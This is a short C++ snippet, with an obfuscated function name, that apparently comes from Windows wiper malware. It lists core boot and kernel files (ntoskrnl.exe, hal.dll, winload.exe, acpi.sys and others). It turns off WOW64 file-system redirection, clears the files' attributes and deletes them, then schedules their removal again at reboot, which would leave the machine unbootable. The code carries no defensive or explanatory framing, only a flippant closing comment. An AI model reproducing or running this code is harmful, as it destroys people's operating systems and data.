void ewiuufwhuefwu() {
    std::vector<std::wstring> killFiles = {
        L"C:\\Windows\\System32\\ntoskrnl.exe",
        L"C:\\Windows\\System32\\hal.dll",
        L"C:\\Windows\\System32\\bootres.dll",
        L"C:\\Windows\\System32\\winload.exe",
        L"C:\\Windows\\System32\\winresume.exe",
        L"C:\\Windows\\System32\\drivers\\acpi.sys"
    };
    PVOID oldValue = nullptr;
    Wow64DisableWow64FsRedirection(&oldValue);
    for (const auto& file : killFiles) {
        SetFileAttributesW(file.c_str(), FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(file.c_str());
        DWORD flags = MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING;
        MoveFileExW(file.c_str(), nullptr, flags);
    }
}
//no comment???
